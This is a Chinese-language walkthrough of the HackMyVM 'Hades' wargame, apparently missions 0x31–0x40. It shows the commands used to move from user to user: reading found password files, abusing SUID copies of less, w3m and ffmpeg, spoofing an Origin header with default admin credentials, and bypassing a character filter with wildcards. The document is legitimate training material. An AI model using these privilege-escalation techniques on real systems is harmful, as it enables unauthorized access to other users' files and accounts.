drwxr-x--- <span class="token number">2</span> root gaia  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root root  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> gaia gaia   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> gaia gaia  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> gaia gaia   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root gaia    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root gaia    <span class="token number">10</span> Apr  <span class="token number">5</span> 06:36 hpass1.txt
-rw-r----- <span class="token number">1</span> root powah   <span class="token number">23</span> Apr  <span class="token number">5</span> 06:36 hpass2.txt
-rw-r----- <span class="token number">1</span> root gaia   <span class="token number">146</span> Apr  <span class="token number">5</span> 06:36 mission.txt
gaia@hades:~$ <span class="token function">cat</span> hpass1.txt 

manuela

gaia@hades:~$ <span class="token function">cat</span> hpass2.txt 
cat: hpass2.txt: Permission denied</code></pre>
<p>第二个文件组是powah，尝试切换到这个用户组,用<code>manuela</code>即可创建</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gaia@hades:~$ newgrp powah
Password: 
gaia@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2021</span><span class="token punctuation">(</span>gaia<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>powah<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>powah<span class="token punctuation">)</span>,2021<span class="token punctuation">(</span>gaia<span class="token punctuation">)</span>
gaia@hades:~$ <span class="token function">cat</span> hpass2.txt 

cuMRRameGdmhVxHcYYYs</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">halcyon@hades:~$ <span class="token function">cat</span> flagz.txt 
^YBkkiwOiBVdzLnxXPdU^</code></pre>
<h2 id="MISSION-0x31"><a href="#MISSION-0x31" class="headerlink" title="MISSION 0x31"></a>MISSION 0x31</h2><pre class="language-bash" data-language="bash"><code class="language-bash">halcyon@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x31 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user hebe has one <span class="token string">'magicword'</span> to get her password using http://localhost/req.php 

<span class="token comment">## ES ##</span>
La usuaria hebe tiene una <span class="token string">'magicword'</span> para obtener <span class="token function">su</span> password usando http://localhost/req.php</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">halcyon@hades:~$ <span class="token function">curl</span> http://localhost/req.php?magicword<span class="token operator">=</span>password

tOlbuBLjFWntVDNmjHIG</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hebe@hades:~$ <span class="token function">cat</span> flagz.txt 
^BAWnwGCghvcBbbRcZVd^</code></pre>
<h2 id="MISSION-0x32"><a href="#MISSION-0x32" class="headerlink" title="MISSION 0x32"></a>MISSION 0x32</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hebe@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x32 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User hera refuses to use Discord, she prefer an older and <span class="token function">open</span> <span class="token builtin class-name">source</span> service.

<span class="token comment">## ES ##</span>
La usuaria hera se niega a usar Discord, prefiere un medio mas antiguo y abierto.</code></pre>
<p>不用discord，用的老的交流工具，确实不知道，看了别人的wp发现是irc，默认在6667端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hebe@hades:~$ /var/tmp/446 <span class="token parameter variable">-tunlnp</span>
Netid                   State                    Recv-Q                   Send-Q                                      Local Address:Port                                        Peer Address:Port                   Process                   
udp                     UNCONN                   <span class="token number">0</span>                        <span class="token number">0</span>                                              <span class="token number">127.0</span>.0.11:56483                                            <span class="token number">0.0</span>.0.0:*                                                
udp                     UNCONN                   <span class="token number">0</span>                        <span class="token number">0</span>                                                 <span class="token number">0.0</span>.0.0:44595                                            <span class="token number">0.0</span>.0.0:*                                                
udp                     UNCONN                   <span class="token number">0</span>                        <span class="token number">0</span>                                                 <span class="token number">0.0</span>.0.0:55168                                            <span class="token number">0.0</span>.0.0:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">4096</span>                                           <span class="token number">127.0</span>.0.11:38595                                            <span class="token number">0.0</span>.0.0:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">128</span>                                             <span class="token number">127.0</span>.0.1:6667                                             <span class="token number">0.0</span>.0.0:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">511</span>                                               <span class="token number">0.0</span>.0.0:80                                               <span class="token number">0.0</span>.0.0:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">128</span>                                               <span class="token number">0.0</span>.0.0:22                                               <span class="token number">0.0</span>.0.0:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">1024</span>                                                    *:1965                                                   *:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">511</span>                                                  <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:80                                                  <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">32</span>                                                      *:21                                                     *:*                                                
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">128</span>                                                  <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22                                                  <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*     </code></pre>
<p>确实开放了6667端口<br><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-irc">https://book.hacktricks.xyz/network-services-pentesting/pentesting-irc</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hebe@hades:~$ /var/tmp/nc <span class="token number">127.0</span>.0.1 <span class="token number">6667</span>
hebe@hades:~$ /var/tmp/busybox <span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">6667</span>
:hades.hmv NOTICE * :*** Looking up your hostname<span class="token punctuation">..</span>.
:hades.hmv NOTICE * :*** Could not resolve your hostname: Request timed out<span class="token punctuation">;</span> using your IP address <span class="token punctuation">(</span><span class="token number">127.0</span>.0.1<span class="token punctuation">)</span> instead.
<span class="token environment constant">USER</span> ran213eqdw123 <span class="token number">0</span> * ran213eqdw123
NICK ran213eqdw123
:hades.hmv 001 ran213eqdw123 :Welcome to the Devilnet IRC Network ran213eqdw123<span class="token operator">!</span>ran213eqdw@127.0.0.1
:hades.hmv 002 ran213eqdw123 :Your <span class="token function">host</span> is hades.hmv, running version InspIRCd-3
:hades.hmv 003 ran213eqdw123 :This server was created <span class="token number">20</span>:29:01 Jun 06 <span class="token number">2024</span>
:hades.hmv 004 ran213eqdw123 hades.hmv InspIRCd-3 iosw Pbiklmnopstv :bklov
:hades.hmv 005 ran213eqdw123 <span class="token assign-left variable">AWAYLEN</span><span class="token operator">=</span><span class="token number">200</span> <span class="token assign-left variable">CASEMAPPING</span><span class="token operator">=</span>rfc1459 <span class="token assign-left variable">CHANLIMIT</span><span class="token operator">=</span><span class="token comment">#:20 CHANMODES=b,k,l,Pimnpst CHANNELLEN=64 CHANTYPES=# ELIST=CMNTU HOSTLEN=64 KEYLEN=32 KICKLEN=255 LINELEN=512 MAXLIST=b:100 :are supported by this server</span>
:hades.hmv 005 ran213eqdw123 <span class="token assign-left variable">MAXTARGETS</span><span class="token operator">=</span><span class="token number">20</span> <span class="token assign-left variable">MODES</span><span class="token operator">=</span><span class="token number">20</span> <span class="token assign-left variable">NAMELEN</span><span class="token operator">=</span><span class="token number">128</span> <span class="token assign-left variable">NETWORK</span><span class="token operator">=</span>Devilnet <span class="token assign-left variable">NICKLEN</span><span class="token operator">=</span><span class="token number">30</span> <span class="token assign-left variable">PREFIX</span><span class="token operator">=</span><span class="token punctuation">(</span>ov<span class="token punctuation">)</span>@+ SAFELIST <span class="token assign-left variable">STATUSMSG</span><span class="token operator">=</span>@+ <span class="token assign-left variable">TOPICLEN</span><span class="token operator">=</span><span class="token number">307</span> <span class="token assign-left variable">USERLEN</span><span class="token operator">=</span><span class="token number">10</span> <span class="token assign-left variable">USERMODES</span><span class="token operator">=</span>,,s,iow WHOX :are supported by this server
:hades.hmv <span class="token number">251</span> ran213eqdw123 :There are <span class="token number">0</span> <span class="token function">users</span> and <span class="token number">0</span> invisible on <span class="token number">1</span> servers
:hades.hmv <span class="token number">253</span> ran213eqdw123 <span class="token number">1</span> :unknown connections
:hades.hmv <span class="token number">254</span> ran213eqdw123 <span class="token number">1</span> :channels formed
:hades.hmv <span class="token number">255</span> ran213eqdw123 :I have <span class="token number">0</span> clients and <span class="token number">0</span> servers
:hades.hmv <span class="token number">265</span> ran213eqdw123 :Current <span class="token builtin class-name">local</span> users: <span class="token number">0</span>  Max: <span class="token number">3</span>
:hades.hmv <span class="token number">266</span> ran213eqdw123 :Current global users: <span class="token number">0</span>  Max: <span class="token number">3</span>
:hades.hmv <span class="token number">422</span> ran213eqdw123 :Message of the day <span class="token function">file</span> is missing.
LISTS
:hades.hmv <span class="token number">421</span> ran213eqdw123 LISTS :Unknown <span class="token builtin class-name">command</span>
LIST
:hades.hmv <span class="token number">321</span> ran213eqdw123 Channel :Users Name
:hades.hmv <span class="token number">322</span> ran213eqdw123 <span class="token comment">#channel666 0 :[+Pnt] Welcome hacker! Take it: JzpyRXRzWoHKZwgWzleM</span>
:hades.hmv <span class="token number">323</span> ran213eqdw123 :End of channel list.</code></pre>
<p>拿到密码<code>JzpyRXRzWoHKZwgWzleM</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hera@hades:~$ <span class="token function">cat</span> flagz.txt 
^GaIAyNGsSRYClSuzVLX^</code></pre>
<h2 id="MISSION-0x33"><a href="#MISSION-0x33" class="headerlink" title="MISSION 0x33"></a>MISSION 0x33</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hera@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x33 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User hermione would like to know what hera was doing. 

<span class="token comment">## ES ##</span>
A la usuaria hermione le gustaria saber que hacia hera.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hera@hades:~$ <span class="token function">cat</span> .bash_history 

<span class="token function">ls</span>
<span class="token function">ps</span>
<span class="token function">sudo</span> <span class="token parameter variable">-u</span> hermione <span class="token function">bash</span>
<span class="token function">cp</span> /etc /etc2
^LVFcQoSJeZgUltXJKnpZ^
<span class="token function">ls</span>
<span class="token function">id</span>
<span class="token function">cat</span> /usr/hera
<span class="token function">rm</span> /usr/hera
<span class="token function">whoami</span>
<span class="token function">zip</span> <span class="token parameter variable">-R</span> etc.zip /etc</code></pre>
<p>拿到了一个flag <code>^LVFcQoSJeZgUltXJKnpZ^</code>，<br>注意到<code>/usr/hera</code>这个目录,发现里面写着密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hera@hades:/usr$ <span class="token function">cat</span> hera
vzhOebSSplFoXPKxwtqU</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hermione@hades:~$ <span class="token function">cat</span> flagz.txt 
^dLcEkLNgdDvOlxtPhjh^</code></pre>
<h2 id="MISSION-0x34"><a href="#MISSION-0x34" class="headerlink" title="MISSION 0x34"></a>MISSION 0x34</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hermione@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x34 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User hero only talks to some groups.

<span class="token comment">## ES ##</span>
La usuaria hero solo se habla con algunos grupos.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hermione@hades:~$ ./beastgroup 

I only trust group <span class="token number">6666</span>, you are group <span class="token number">2025</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/06/OPLIMM.png" alt="OPLIMM.png" loading="lazy"><br>反编译直接拿到密码了<code>vlImTDSGnTMwLFgRWCOc</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hero@hades:~$ <span class="token function">cat</span> flagz.txt 
^KUEUoYgCWKlUTpywGeK^</code></pre>
<h2 id="MISSION-0x35"><a href="#MISSION-0x35" class="headerlink" title="MISSION 0x35"></a>MISSION 0x35</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hero@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x35 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User hestia likes to keep the <span class="token function">screen</span> clean.

<span class="token comment">## ES ##</span>
A la usuaria hestia le gusta mantener la pantalla limpia.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hero@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">48</span>
drwxr-x--- <span class="token number">2</span> root hero  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root root  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> hero hero   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> hero hero  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> hero hero   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
---s--s--- <span class="token number">1</span> root hero <span class="token number">16056</span> Apr  <span class="token number">5</span> 06:36 cleaner
-rw-r----- <span class="token number">1</span> root hero    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root hero   <span class="token number">173</span> Apr  <span class="token number">5</span> 06:36 mission.txt</code></pre>
<p>注意到cleaner有suid权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hero@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2026</span><span class="token punctuation">(</span>hero<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2226</span><span class="token punctuation">(</span>her0<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2226</span><span class="token punctuation">(</span>her0<span class="token punctuation">)</span>,2026<span class="token punctuation">(</span>hero<span class="token punctuation">)</span></code></pre>
<p>权限组根uid不同,看看这个组的其他文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hero@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-group</span> her0 <span class="token parameter variable">-type</span> f <span class="token parameter variable">-exec</span> <span class="token function">ls</span> <span class="token parameter variable">-l</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> + <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> proc
-rw-r----- <span class="token number">1</span> root her0 <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 /usr/share/libs</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hero@hades:~$ <span class="token function">cat</span> /usr/share/libs
opTNnZQAuFJsauNPHXVq</code></pre>
<p>读取发现密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hestia@hades:~$ <span class="token function">cat</span> flagz.txt 
^mIZKIDJYZQDogbkwRGy^</code></pre>
<h2 id="MISSION-0x36"><a href="#MISSION-0x36" class="headerlink" title="MISSION 0x36"></a>MISSION 0x36</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hestia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x36 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User ianthe has left us her own less.

<span class="token comment">## ES ##</span>
La usuaria ianthe nos ha dejado <span class="token function">su</span> propio less.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hestia@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">228</span>
drwxr-x--- <span class="token number">2</span> root   hestia   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root     <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> hestia hestia    <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> hestia hestia   <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> hestia hestia    <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root   hestia     <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-r-s--s--- <span class="token number">1</span> ianthe hestia <span class="token number">198960</span> Apr  <span class="token number">5</span> 06:36 <span class="token function">less</span>
-rw-r----- <span class="token number">1</span> root   hestia    <span class="token number">157</span> Apr  <span class="token number">5</span> 06:36 mission.txt</code></pre>
<p>less所有者是ianthe,直接读ianthe的密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hestia@hades:~$ ./less /opt/ianthe_pass.txt
DphioLqgVIIFclTwBsMP</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">ianthe@hades:~$ <span class="token function">cat</span> flagz.txt 
^SdoibXIPAdqIdzDrYId^</code></pre>
<h2 id="MISSION-0x37"><a href="#MISSION-0x37" class="headerlink" title="MISSION 0x37"></a>MISSION 0x37</h2><pre class="language-bash" data-language="bash"><code class="language-bash">ianthe@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x37 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
Seems that irene is developing an auth system http://localhost/irene_auth.php only accessible by hackmyvm.hmv.
<span class="token punctuation">(</span>No bruteforce required, just some <span class="token string">"admin"</span> default pass <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
<span class="token comment">## ES ##</span>
Parece que irene esta desarrollando algun sistema de autenticacion http://localhost/irene_auth.php solo accesible por hackmyvm.hmv.
<span class="token punctuation">(</span>No se requiere bruteforce, solo algunas pass por defecto de <span class="token string">"admin"</span> <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></code></pre>
<p>试了好多发现Origin有效</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ianthe@hades:~$ <span class="token function">curl</span> <span class="token parameter variable">-H</span> <span class="token string">"Origin: hackmyvm.hmv"</span> http://localhost/irene_auth.php

            <span class="token operator">&lt;</span>form <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"post"</span> <span class="token assign-left variable">action</span><span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span>
                <span class="token operator">&lt;</span>label <span class="token assign-left variable">for</span><span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">></span>Username:<span class="token operator">&lt;</span>/label<span class="token operator">></span>
                <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"text"</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">"username"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"username"</span> required<span class="token operator">></span>
                <span class="token operator">&lt;</span>br<span class="token operator">></span>
                <span class="token operator">&lt;</span>label <span class="token assign-left variable">for</span><span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">></span>Password:<span class="token operator">&lt;</span>/label<span class="token operator">></span>
                <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"password"</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">"password"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"password"</span> required<span class="token operator">></span>
                <span class="token operator">&lt;</span>br<span class="token operator">></span>
                <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"submit"</span> <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token string">"Login"</span><span class="token operator">></span>
            <span class="token operator">&lt;</span>/form<span class="token operator">></span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">ianthe@hades:~$ <span class="token function">curl</span> <span class="token parameter variable">-H</span> <span class="token string">"Origin: hackmyvm.hmv"</span> <span class="token parameter variable">-d</span> <span class="token string">"username=admin&amp;password=admin"</span> http://localhost/irene_auth.php
TDyuLyWLDksEhgmAYDJCianthe@hades:~$ </code></pre>
<p>拿到密码<code>TDyuLyWLDksEhgmAYDJC</code></p>
<pre class="language-none"><code class="language-none">&#96;&#96;&#96;bash
irene@hades:~$ cat flagz.txt 
^ZACnrFArVosWGJNfPkN^</code></pre>
<h2 id="MISSION-0x38"><a href="#MISSION-0x38" class="headerlink" title="MISSION 0x38"></a>MISSION 0x38</h2><pre class="language-bash" data-language="bash"><code class="language-bash">irene@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x38 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User iris hates some characters.

<span class="token comment">## ES ##</span>
La usuaria iris odia algunos caracteres.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">irene@hades:~$ ./hatechars 
Enter <span class="token function">file</span> to show:
qwe
Invalid character<span class="token operator">!</span><span class="token operator">!</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">irene@hades:~$ ./hatechars 
Enter <span class="token function">file</span> to show:
/pwned/iris/flagz.txt
Invalid character<span class="token operator">!</span><span class="token operator">!</span></code></pre>
<p>试了一下不能输入字母，试了一下可以使用通配符?绕过，比如读取irene的flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">irene@hades:~$ ./hatechars 
Enter <span class="token function">file</span> to show:
/?????/?????/?????????
^ZACnrFArVosWGJNfPkN^
/bin/cat: /pwned/irene/hatechars: Permission denied</code></pre>
<p>但是不知道iris密码放哪儿了,看了wp发现在etc下面的一个目录里<br>找一下iris用户的文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">irene@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-user</span> iris <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> proc
/dev/pts/1
/etc/met.txt</code></pre>
<p>应该放在&#x2F;etc&#x2F;met.txt里面了，防止读取过多文件，直接去etc目录使用hatechars</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">irene@hades:/etc$ /pwned/irene/hatechars
Enter <span class="token function">file</span> to show:
???????  
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
ignore Received Message-Id Resent-Message-Id Status Mail-From Return-Path Via Delivered-To
FiqGNcXumTKwLTPRqXMh
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.</code></pre>
<p>密码<code>FiqGNcXumTKwLTPRqXMh</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">iris@hades:~$ <span class="token function">cat</span> flagz.txt 
^xXcULtRBXxcHIUVxtXT^</code></pre>
<h2 id="MISSSION-0x39"><a href="#MISSSION-0x39" class="headerlink" title="MISSSION 0x39"></a>MISSSION 0x39</h2><pre class="language-bash" data-language="bash"><code class="language-bash">iris@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x39 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User kore likes to navigate<span class="token operator">!</span> 

<span class="token comment">## ES ##</span>
A la usuaria kore le gusta navegar<span class="token operator">!</span></code></pre>
<p>没有sudo，没有文件，搜一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">iris@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-user</span> kore <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> proc
/srv/kore_pass.txt
/dev/pts/3
/usr/bin/w3m
/var/tmp/a.avi
/var/tmp/b.avi
/var/tmp/ff.py
/var/tmp/sss.mp4
/var/tmp/temp_txt.txt</code></pre>
<p>有一条指令w3m是kore的</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">iris@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /usr/bin/w3m
-rwS--s--- <span class="token number">1</span> kore iris <span class="token number">1630888</span> Jan <span class="token number">29</span>  <span class="token number">2023</span> /usr/bin/w3m</code></pre>
<p>有suid权限，直接读密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">iris@hades:~$ /usr/bin/w3m /srv/kore_pass.txt <span class="token parameter variable">-dump</span>
mdAXiSXteTPiGGTpmajP</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">kore@hades:~$ <span class="token function">cat</span> flagz.txt 
^FEYohPSMjrxKzdLNxkQ^</code></pre>
<h2 id="MISSION-0x40"><a href="#MISSION-0x40" class="headerlink" title="MISSION 0x40"></a>MISSION 0x40</h2><pre class="language-bash" data-language="bash"><code class="language-bash">kore@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x40 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User leda always wanted to edit videos.

<span class="token comment">## ES ##</span>
La usuaria leda siempre quiso editar videos.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">kore@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-user</span> leda <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> proc
/usr/bin/ffmpeg
/var/tmp/sss5.mp4
/var/tmp/sss3.mp4
/var/tmp/sss2.mp4
/var/tmp/sa.txt
/var/tmp/1234
/var/tmp/output.mp4
/etc/led</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">kore@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /etc/led
-r--r----- <span class="token number">1</span> leda leda <span class="token number">14</span> Sep <span class="token number">21</span>  <span class="token number">2005</span> /etc/led
kore@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /usr/bin/ffmpeg
-rwS--s--- <span class="token number">1</span> leda kore <span class="token number">293288</span> Nov <span class="token number">11</span>  <span class="token number">2023</span> /usr/bin/ffmpeg</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">kore@hades:~$ /usr/bin/ffmpeg <span class="token parameter variable">-f</span> concat  <span class="token parameter variable">-safe</span> <span class="token number">0</span>  <span class="token parameter variable">-i</span> /etc/led                                                                                                                                                                                
ffmpeg version <span class="token number">5.1</span>.4-0+deb12u1 Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2000</span>-2023 the FFmpeg developers
  built with gcc <span class="token number">12</span> <span class="token punctuation">(</span>Debian <span class="token number">12.2</span>.0-14<span class="token punctuation">)</span>
  configuration: <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr --extra-version<span class="token operator">=</span><span class="token number">0</span>+deb12u1 <span class="token parameter variable">--toolchain</span><span class="token operator">=</span>hardened <span class="token parameter variable">--libdir</span><span class="token operator">=</span>/usr/lib/x86_64-linux-gnu <span class="token parameter variable">--incdir</span><span class="token operator">=</span>/usr/include/x86_64-linux-gnu <span class="token parameter variable">--arch</span><span class="token operator">=</span>amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libsvtav1 --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --enable-opengl --enable-sdl2 --disable-sndio --enable-libjxl --enable-pocketsphinx --enable-librsvg --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-libplacebo --enable-librav1e --enable-shared
  libavutil      <span class="token number">57</span>. <span class="token number">28.100</span> / <span class="token number">57</span>. <span class="token number">28.100</span>
  libavcodec     <span class="token number">59</span>. <span class="token number">37.100</span> / <span class="token number">59</span>. <span class="token number">37.100</span>
